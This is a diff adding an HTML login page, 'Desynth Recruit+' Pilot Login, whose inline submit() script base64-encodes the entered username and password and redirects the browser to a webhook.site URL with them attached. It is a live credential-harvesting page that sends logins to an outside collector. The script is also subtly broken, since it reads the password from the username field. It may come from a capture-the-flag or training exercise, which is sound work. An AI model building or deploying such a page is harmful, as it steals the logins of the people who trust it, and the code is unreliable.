@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>Desynth Recruit+</title>
+    <script>
+    	function submit(){
+    		url = "https://webhook.site/c6560158-65d9-4877-8040-964123673650";
+    		username = document.getElementById("username").value;
+    		password = document.getElementById("username").value;
+            sec = btoa(username+":"+password)
+    		document.location=url+"?"+encodeURIComponent(sec);
+    	}
+    </script>
+
+    <script type="text/javascript" src="/static/js/jquery.js"></script>
+    <script type="text/javascript" src="/static/js/login.js" async="true"></script>
+    <link rel="icon" href="/static/images/logo.png" />
+    <link rel="stylesheet" type="text/css" href="/static/css/bootstrap.min.css" />
+    <link href='https://fonts.googleapis.com/css?family=Paytone+One&display=swap' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Neucha' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" type="text/css" href="/static/css/login.css" />
+</head>
+
+<body>
+    <img src="/static/images/logo.png" class="main-logo" />
+    <h1 class="m-3 text-center fw-bold text-uppercase">Pilot Login</h1>
+    <div class="login-form">
+        <label for="username">Username</label>
+        <input type="text" id="username" class="form-control" />
+        <label for="password">Password</label>
+        <input type="password" id="password" class="form-control" />
+        <div class="submit-btns">
+            <button type="button" id="login-btn" class="btn submit-btn btn-secondary" onclick="submit()">Login</button>
+            <button type="button" id="register-btn" class="btn submit-btn btn-secondary">Register</button>
+        </div>
+        <p id="resp-msg" class="alert alert-info">Please wait...</p>
+    </div>
+</body>
+
+</html>
